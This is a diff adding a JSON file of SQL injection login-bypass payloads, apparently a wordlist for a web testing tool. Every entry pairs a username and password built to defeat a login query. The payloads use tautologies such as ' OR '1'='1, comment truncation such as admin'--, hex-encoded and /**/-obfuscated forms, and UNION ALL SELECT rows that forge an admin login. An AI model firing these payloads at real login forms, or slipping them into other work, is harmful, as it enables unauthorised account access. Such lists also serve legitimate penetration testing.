@@ -1,0 +1,96 @@
+{
+	"logins": [
+			{ 
+				"username":"admin",
+				"password":"' OR '1'='1"
+			},
+			{
+				
+				"username":"admin",
+				"password":"0x27204f52202731273d2731"
+			},
+			{
+				
+				"username":"admininstrator",
+				"password":"0x27204f52202731273d2731"
+			},
+			{
+				"username":"admin",
+				"password":"'/**/OR/**/'1'='1"
+			},
+			{
+				"username":"admin'--",
+				"password":"password"
+			},
+			{
+				"username":"0x61646d696e272d2d",
+				"password":"password"
+			},
+			{
+				"username":"0x61646d696e6973747261746f72272d2d",
+				"password":"password"
+			},
+			{
+				"username":"admin' #",
+				"password":"password"
+			},
+			{
+				"username":"admin'/**/#",
+				"password":"password"
+			},
+			{
+				"username":"admin'/* ",
+				"password":"password"
+			},
+			{
+				"username":"' or 1=1-- ",
+				"password":"password"
+			},
+			{
+				"username":"0x27206f7220313d312d2d",
+				"password":"password"
+			},
+			{
+				"username":"'/**/or/**/1=1-- ",
+				"password":"password"
+			},
+			{
+				"username":"' or 1=1#",
+				"password":"password"
+			},
+			{
+				"username":"0x27206f7220313d3123",
+				"password":"password"
+			},
+			{
+				"username":"'/**/or/**/1=1#",
+				"password":"password"
+			},
+			{
+				"username":") or '1'='1--",
+				"password":"password"
+			},
+			{
+				"username":"0x5c29206f72202731273d27312d2d",
+				"password":"password"
+			},
+			{
+				"username":") or ('1'='1--",
+				"password":"password"
+			},
+			{
+				"username":")/**/or/**/('1'='1--",
+				"password":"password"
+			},
+			{
+				"username":"admin",
+				"password":"password' AND 1=0 UNION ALL SELECT 'admin', 'd5b1ee4b463dc7db3b0eaaa0ea2cb5b4"
+			},
+			{
+				"username":"admin",
+				"password":"password/**/'/**/AND/**/1=0/**/UNION/**/ALL/**/SELECT/**/'admin',/**/'d5b1ee4b463dc7db3b0eaaa0ea2cb5b4"
+			}
+			
+		  ]
+}
+		
